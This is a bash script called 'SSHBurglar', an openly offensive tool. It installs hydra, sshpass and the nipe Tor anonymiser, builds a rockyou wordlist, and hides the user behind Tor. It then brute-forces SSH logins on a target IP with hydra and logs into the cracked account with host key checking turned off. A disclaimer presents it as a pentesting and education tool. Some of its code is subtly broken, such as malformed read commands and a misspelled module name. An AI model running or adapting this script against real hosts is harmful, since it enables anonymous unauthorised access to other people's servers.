#!/bin/bash

#########################
### SSHBURGLAR FUNCTIONS
#########################

# INSTALL(): automatically installs relevant applications on user host and creates relevant directories
# CONSOLE(): collects user input for the target IP address to breach
# ANON(): executes nipe anonymiser and conducts an anonymity check
# SSHBREACH(): collects user input for VPS address, executes a hydra brute-force attack and accesses the vps

#####################
### INSTALL FUNCTION
#####################

### DEFINITION

function INSTALL()
{
	### START
	# let the user know that SSHBurglar is starting
	echo " "
	echo "[*] EXECUTION OF INSTALL MODULE:"
	echo " "
	echo "[*] Installing and updating applications on your local computer..."
	echo " "
	echo "[*] Creating new directory: ~/SSHBurglar..."
	echo " "
	
	### APT UPDATE
	# update APT packages
	sudo apt-get -y update
	sudo apt-get -y upgrade
	sudo apt-get -y dist-upgrade
	
	### DIRECTORY
	# create a directory to contain output files later
	cd ~
	mkdir SSHBurglar
	cd ~/SSHBurglar
	echo "[+] Directory created: ~/SSHBurglar"
	echo " "
	
		
	### WORDLIST CONFIGURATION
	echo "[*] Configuring Wordlists..."
	echo " "
	cd /usr/share/wordlists
	sudo gunzip rockyou.txt.gz
	sudo cp rockyou.txt ~/SSHBurglar/wordlist.txt
	cd ~/SSHBurglar
	sudo sed -i '1i kali' wordlist.txt
	WordList=~/SSHBurglar/wordlist.txt
	echo "[+] Wordlist created: ~/SSHBurglar/wordlist.txt"
	echo " "
	
  	### FIGLET INSTALLATION
	# install figlet for aesthetic purposes
	mkdir figrc
	cd ~/SSHBurglar/figrc
	sudo apt-get -y install figlet
	# install cybermedium figlet font; credits: http://www.figlet.org
	wget http://www.jave.de/figlet/fonts/details/cybermedium.flf
	cd ~/SSHBurglar
	
	### CORE APPLICATIONS INSTALLATION
	# install relevant applications
	sudo apt-get -y install wordlists
	sudo apt-get -y install ssh
	sudo apt-get -y install sshpass
	sudo apt-get -y install hydra
	sudo apt-get install tor
	git clone https://github.com/htrgouvea/nipe.git 
	cd ~/SSHBurglar/nipe 
	sudo cpan install Try:Tiny Config::Simple JSON
	sudo perl nipe.pl install
	
	### END
	# let the user know applications are installed
	echo " "
	echo "[+] Applications installed and updated."
	echo "	"
}

###############
### SSH_BREACH
###############

### DEFINITION
function SSHBREACH()
{
	### BRUTE-FORCE ATTACK
	echo " "
	echo "[*] EXECUTION OF SSH_BREACH MODULE:"
	echo " "
	sudo hydra -f -L $WordList -P $WordList $vpsip ssh -t 4 -vV > crackedusers.txt
	crackstatus=$(cat crackedusers.txt | grep host: | awk '{print $2}')
	
	### SUCCESSFUL ATTACK
	if [ "$crackstatus" == "host:" ]
	then
		### DISPLAY OF CRACKED USERS
		# let user know about the number and details of cracked users to choose from
		echo "[+] Attack successful:"
		echo "[+] $(cat crackedusers.txt | grep host: | wc -l) Cracked Users: (Format: <username> <password>)"
		echo "$(cat crackedusers.txt | grep host: | awk '{print $5, $7}')"
		echo " "
		
		### SELECTION OF CRACKED USER
		read -p "[!] Enter the cracked user you want to access as: " $vpsuser
		echo " "
		read -p "[!] Enter the password of the cracked user: " $vpspass
		echo " "
		echo "[*] Connecting to $vpsip now..."
		
		### ANONYMOUS ACCESS
		sshpass -p "$vpspass" ssh -o StrictHostKeyChecking=no "$vpsuser"@"$vpsip" 2> /dev/null
	
	### UNSUCCESSFUL ATTACK
	else
		### EXIT
		echo "[-] Attack unsuccessful. Exiting program now..."
		exit
	fi
}

#########
### ANON
#########

### DEFINITION
function ANON()
{
	### START
	# let the user know anonymity check is starting
	echo " "
	echo "[*] EXECUTION OF SSH_BREACH MODULE:"
	echo " "
	echo "[*] Conducting Anonymity Check..."
	echo " "
	
	### ANONYMISATION
	# execute nipe in nipe folder
	cd ~/SSHBurglar/nipe
	sudo perl nipe.pl start
	sudo perl nipe.pl stop
	sudo perl nipe.pl start
	
	### ANONYMITY CHECK
	sudo perl nipe.pl status
	# if nipestatus shows "activated", user is anonymous
	nipestatus="$(sudo perl nipe.pl status | grep activated | awk '{print $3}' | awk -F. '{print $1}')"
	
	### SUCCESSFUL ANONYMISATION
	if [ "$nipestatus" == "activated" ]
	then
		### PROCEED
		echo " "
		echo "[+] ANONYMITY CHECK: You are currently anonymous."
		echo " "
		# after anonymity check, call the SSHBREACH function
		SSHBREACH
	
	### UNSUCCESSFUL ANONYMISATION
	else
		### EXIT
		echo " "
		echo "[-] ANONYMITY CHECK: You are currently not anonymous."
		echo " "
		echo "[-] Error in activating nipe. Exiting now..."
		echo " "
		exit
		
	fi	
}

############
### CONSOLE
############

function CONSOLE()
{
	### START
	### INSTALLATION CHECK
	# check to see if installations and configuration have already been done
	echo " "
	read -p "[!] INSTALLATION CHECK:
	
	[*] Enter 'y' key to install all relevant applications and configurations
	[*] Enter 'n' key to skip installation (if you have installed previously)
	
	[!] Enter Option: " answer
	
	# process options through 'if' conditional flow
	# if already installed, head to directory directly
	if [ $answer == "n" ] 
	then
		cd ~/SSHBurglar
		continue 2>/dev/null 
	# if not,call the INSTALL function
	else
		if [ $answer == "y" ] 
		then
			echo " "
			INSTALL
			continue 2>/dev/null 
		fi
	fi
	
	### CONSOLE DISPLAY
	# display figlet for aesthetics, with short description of program
	echo " "
	figlet -c -f ~/SSHBurglar/figrc/cybermedium.flf -t "SSHBURGLAR"
	# description of functions
	echo " "
	echo "[*] IMPORTANT NOTICE:"
	echo "This program is for  testing the basic security of an SSH Server. Please use for penetration testing and education purposes only."
	echo " "
	echo "[*] RAPID TESTING CONFIGURATION:"
	echo "For quick testing, configure the target host to have the user and password as 'kali'."
	echo " "
	echo "[!] EXIT:"
	echo "Press Ctrl-C to exit."
	echo " "
	
	### VPS ADDRESS INPUT
	echo "[!] START OF SESSION:"
	echo " "
	read -p "[!] Enter VPS IP Address: " vpsip
	cd ~/SSHBurglar
	mkdir $vpsip
	cd ~/SSHBurglar/$vpsip
	echo " "
	echo "[+] Directory created: ~/SSHBurglar/$vpsip"
	echo " "
	
	### ANON EXECUTION
	ANON
}

### CONSOLE EXECUTION
CONSOLE
